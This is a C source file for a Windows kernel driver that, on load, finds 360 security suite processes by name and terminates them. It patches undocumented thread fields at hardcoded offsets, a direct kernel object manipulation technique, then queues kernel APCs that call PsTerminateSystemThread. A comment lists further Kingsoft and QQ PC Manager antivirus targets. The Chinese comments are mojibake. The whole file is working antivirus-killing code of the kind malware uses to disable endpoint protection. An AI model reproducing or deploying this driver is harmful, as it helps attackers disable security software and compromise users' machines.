#include <ntddk.h>
typedef VOID (*MyPspExitThread)(NTSTATUS status);
MyPspExitThread PspExitThread;
NTSTATUS
	PsLookupProcessByProcessId(
	IN HANDLE ProcessId,
	OUT PEPROCESS *Process
	);

typedef enum _KAPC_ENVIRONMENT {
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
} KAPC_ENVIRONMENT;

NTSTATUS
	PsLookupThreadByThreadId(
	IN HANDLE ThreadId,
	OUT PETHREAD *Thread
	);
PEPROCESS
	IoThreadToProcess(
	IN PETHREAD  Thread
	); 

VOID KeInitializeApc (
	PKAPC Apc,
	PETHREAD Thread,
	KAPC_ENVIRONMENT Environment,
	PKKERNEL_ROUTINE KernelRoutine,
	PKRUNDOWN_ROUTINE RundownRoutine,
	PKNORMAL_ROUTINE NormalRoutine,
	KPROCESSOR_MODE ProcessorMode,
	PVOID NormalContext
	);

BOOLEAN KeInsertQueueApc(PKAPC Apc,PVOID SystemArg1,PVOID SystemArg2,KPRIORITY Increment);
VOID APCRT(PKAPC Apc,PKNORMAL_ROUTINE*NormalRoutine,PVOID  *NormalContext,PVOID *SystemArgument1,PVOID *SystemArgument2)
{
	ExFreePool(Apc);
	//PspExitThread = (MyPspExitThread)0x805d3086;
	//PspExitThread(STATUS_SUCCESS);
	PsTerminateSystemThread(STATUS_SUCCESS);
}

BOOLEAN My_PspTerminateProcess(PEPROCESS Process)
{
	ULONG i;
	PETHREAD txtd;
	PEPROCESS txps;
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	for (i=8;i<=65536;i+=4)
	{
		st = PsLookupThreadByThreadId(i,&txtd);
		if ( NT_SUCCESS(st) )
		{
			txps=IoThreadToProcess(txtd);
			if ( txps == Process )
			{
				MyPspTerminatePsByPointer(txtd);
			}
		}
	}
	return TRUE;
}

NTSTATUS MyPspTerminatePsByPointer(PETHREAD Thread)
{
	//ϵͳ�̳߳�����־
	ULONG Systerm_Thread_Sign= 0x10;
	ULONG Size = 0;
	ULONG i = 0;
	PKAPC pApc = 0;

	if ( MmIsAddressValid((PVOID)Thread))//����ҪУ���ַ,��Ч�Ļ���DKOM
	{
		*(PULONG)((ULONG)Thread + 0x248) =Systerm_Thread_Sign;

		pApc = ExAllocatePoolWithTag(NonPagedPool,sizeof(KAPC),'apc');

		if (pApc)
		{
			//apcrt ��apc����
			KeInitializeApc(pApc,Thread,OriginalApcEnvironment,APCRT,0,0,KernelMode,0);
			KeInsertQueueApc(pApc,pApc,0,2);
		}
	}
	return STATUS_SUCCESS;
}

PEPROCESS SearchProcessByName(const char* ProcessName)
{
	ULONG i = 0;
	PEPROCESS hProcess;
	for(i=0;i<65535;i+=4)
	{
		if(PsLookupProcessByProcessId((HANDLE)i,&hProcess)==STATUS_SUCCESS)
		{
			if (strcmp(ProcessName,(char*)((ULONG)hProcess+0x174)) == 0)
			{
				return hProcess;
			}
		}
	}
	return NULL;
}

void DriverUnload(PDRIVER_OBJECT driver)
{
	DbgPrint("����ֹͣ����!\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path)
{
	PEPROCESS hProcess1;
	PEPROCESS hProcess2;
	PEPROCESS hProcess3;
	PEPROCESS hProcess4;
	PEPROCESS hProcess5;

	hProcess1 = SearchProcessByName("ZhuDongFangYu.e");
	if(hProcess1 != NULL)
	{
		//DbgPrint("�ҵ�����ʼ������������\n");
		My_PspTerminateProcess(hProcess1);
		//DbgPrint("������������\n");
	}
	hProcess2 = SearchProcessByName("360Tray.exe");
	if(hProcess2 != NULL)
	{
		//DbgPrint("�ҵ�����ʼ����360Tray\n");
		//DbgPrint("%x\n",hProcess2);
		My_PspTerminateProcess(hProcess2);
		//DbgPrint("����360Tray\n");
	}
	hProcess3 = SearchProcessByName("360speedld.exe");
	if(hProcess3 != NULL)
	{
		//DbgPrint("�ҵ�����ʼ����360Tray\n");
		//DbgPrint("%x\n",hProcess2);
		My_PspTerminateProcess(hProcess3);
		//DbgPrint("����360Tray\n");
	}
	hProcess4 = SearchProcessByName("360Safe.exe");
	if(hProcess4 != NULL)
	{
		//DbgPrint("�ҵ�����ʼ����360Tray\n");
		//DbgPrint("%x\n",hProcess2);
		My_PspTerminateProcess(hProcess4);
		//DbgPrint("����360Tray\n");
	}
	hProcess5 = SearchProcessByName("LiveUpdate360.e");
	if(hProcess5 != NULL)
	{
		//DbgPrint("�ҵ�����ʼ����360Tray\n");
		//DbgPrint("%x\n",hProcess2);
		My_PspTerminateProcess(hProcess5);
		//DbgPrint("����360Tray\n");
	}
	driver->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
	/*
	*****360����*****
	ZhuDongFangYu.e
	360Tray.exe
	360speedld.exe
	360Safe.exe
	LiveUpdate360.e
	*****��ɽ����*****
	kscan.exe
	kxetray.exe
	kxescore.exe
	*****QQ���Թܼҽ���*****
	QQPCRTP.exe
	QQPCRealTimeSpe
	QMDL.exe
	QQPCTray.exe
	*/
}

/*
https://blog.csdn.net/py_panyu/article/details/45012289
2.����APC����������.��ʵ������������������͵�һ����һ����.��Ϊ��һ�ַ�������ͨ��PspTerminateProcess ->PspTerminateThreadByPointer ->KeInitializeApc/KeInsertQueueApc���������̵�.���ǲ�ͬ���ǵ�һ�ַ�����PspTerminateProcessͨ��PEPROCESS��hreadListHead��������ȡ�����߳�,Ȼ��PspTerminateThreadByPointerһ�����İ��̸߳ɵ�.����������޸�����,����PsGetNextProcessThread�������߳�.������һ������Ϊ�㹻���������ö�ٲ������߳�
����ΪPsLookupThreadByThreadId�����߳�ID��ȡ�߳̽ṹָ�룬��ͨ��IoThreadToProcess�����߳�ָ��ṹ�������߳������Ľ���ָ�룬Ȼ��Ա�ȷ�����߳�����Ŀ����̺󣬵���PspTerminateThreadBypointer������߳̽ṹָ�룬�ɵ���
*/

/*
ΪʲôҪ���̱߳�־�޸�Ϊϵͳ�߳��أ���Ϊ������Ҫʹ�õ�����PsTerminateSystemThread�������������֣�����ֻ�ܽ���ϵͳ�̣߳�����ֻ�Ե�ǰ�����߳���Ч����Ψһ�Ĳ�������ExitStatus����������Ҫʹ�����������ֻ����ƭ����Ҫ�������߳���ϵͳ�̡߳��ر�ģ�ֻ�����ں�APC������ʹ�ã�������Ч�����ǰ��Լ����̸߳������ˣ����ִ�д˺������߳���ϵͳ�̣߳�������CrossThreadFlagsƫ����Ӳ���룬��������ֻ�ܸ���ϵͳʹ��Ӳ���룬
WindowsXP��Ӳ������0x248��Windows2003��Ӳ������0x240��WindowsVISTA��Windows2008��Ӳ������0x260��Windows7��Ӳ������0x280.
*/